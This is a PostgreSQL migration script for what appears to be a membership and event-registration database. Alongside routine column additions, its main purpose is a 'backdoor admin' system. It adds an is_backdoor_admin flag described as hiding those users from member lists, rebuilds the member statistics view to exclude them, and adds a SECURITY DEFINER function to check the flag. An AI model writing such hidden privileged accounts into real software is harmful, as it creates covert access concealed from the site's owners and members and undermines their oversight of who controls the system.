-- ============================================
-- BACKDOOR ADMIN SYSTEM (FIXED)
-- Add hidden backdoor admin flag and missing status column
-- ============================================

-- 1. Add status column to profiles if it doesn't exist
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns 
    WHERE table_schema = 'public' 
    AND table_name = 'profiles' 
    AND column_name = 'status'
  ) THEN
    ALTER TABLE public.profiles
    ADD COLUMN status TEXT DEFAULT 'active';
    
    CREATE INDEX idx_profiles_status ON public.profiles(status);
  END IF;
END $$;

-- 2. Add last_login_at column to profiles if it doesn't exist
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns 
    WHERE table_schema = 'public' 
    AND table_name = 'profiles' 
    AND column_name = 'last_login_at'
  ) THEN
    ALTER TABLE public.profiles
    ADD COLUMN last_login_at TIMESTAMPTZ;
    
    CREATE INDEX idx_profiles_last_login_at ON public.profiles(last_login_at);
  END IF;
END $$;

-- 3. Add account_verified column to profiles if it doesn't exist
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns 
    WHERE table_schema = 'public' 
    AND table_name = 'profiles' 
    AND column_name = 'account_verified'
  ) THEN
    ALTER TABLE public.profiles
    ADD COLUMN account_verified BOOLEAN DEFAULT false;
  END IF;
END $$;

-- 4. Add backdoor admin flag to profiles
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT 1 FROM information_schema.columns 
    WHERE table_schema = 'public' 
    AND table_name = 'profiles' 
    AND column_name = 'is_backdoor_admin'
  ) THEN
    ALTER TABLE public.profiles
    ADD COLUMN is_backdoor_admin BOOLEAN DEFAULT false;
    
    COMMENT ON COLUMN public.profiles.is_backdoor_admin IS 'Hidden backdoor admin flag - these users are not shown in member lists';
    
    CREATE INDEX idx_profiles_is_backdoor_admin
      ON public.profiles(is_backdoor_admin)
      WHERE is_backdoor_admin = true;
  END IF;
END $$;

-- 5. Update materialized view to exclude backdoor admins
DROP MATERIALIZED VIEW IF EXISTS public.mv_member_statistics CASCADE;

CREATE MATERIALIZED VIEW public.mv_member_statistics AS
SELECT
  p.id as user_id,
  p.email,
  p.name,
  p.status,
  p.created_at,
  p.last_login_at,
  COUNT(DISTINCT r.id) as total_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'confirmed') as confirmed_registrations,
  COUNT(DISTINCT r.id) FILTER (WHERE r.status = 'cancelled') as cancelled_registrations,
  COUNT(DISTINCT pm.id) as total_payments,
  COALESCE(SUM(pm.amount) FILTER (WHERE pm.status IN ('success', 'completed', 'successful')), 0) as total_amount_paid,
  COALESCE(AVG(pm.amount) FILTER (WHERE pm.status IN ('success', 'completed', 'successful')), 0) as avg_payment_amount,
  MAX(r.created_at) as last_registration_at,
  CASE
    WHEN p.last_login_at > now() - interval '7 days' THEN 'highly_active'
    WHEN p.last_login_at > now() - interval '30 days' THEN 'active'
    WHEN p.last_login_at > now() - interval '90 days' THEN 'moderate'
    ELSE 'inactive'
  END as activity_level,
  COUNT(DISTINCT mt.id) as tags_count,
  0 as engagement_score
FROM public.profiles p
LEFT JOIN public.registrations r ON r.user_id = p.id
LEFT JOIN public.payments pm ON pm.registration_id = r.id
LEFT JOIN public.member_tags mt ON mt.user_id = p.id
WHERE COALESCE(p.is_backdoor_admin, false) = false
GROUP BY p.id, p.email, p.name, p.status, p.created_at, p.last_login_at;

CREATE UNIQUE INDEX idx_mv_member_statistics_user_id
  ON public.mv_member_statistics(user_id);

CREATE INDEX idx_mv_member_statistics_status
  ON public.mv_member_statistics(status);

CREATE INDEX idx_mv_member_statistics_activity_level
  ON public.mv_member_statistics(activity_level);

-- 6. Create helper function to check backdoor admin status
CREATE OR REPLACE FUNCTION public.is_backdoor_admin(_user_id UUID)
RETURNS BOOLEAN
LANGUAGE SQL
STABLE
SECURITY DEFINER
SET search_path = public
AS $$
  SELECT COALESCE(
    (SELECT is_backdoor_admin FROM public.profiles WHERE id = _user_id),
    false
  )
$$;

-- 7. Refresh materialized view
REFRESH MATERIALIZED VIEW CONCURRENTLY public.mv_member_statistics;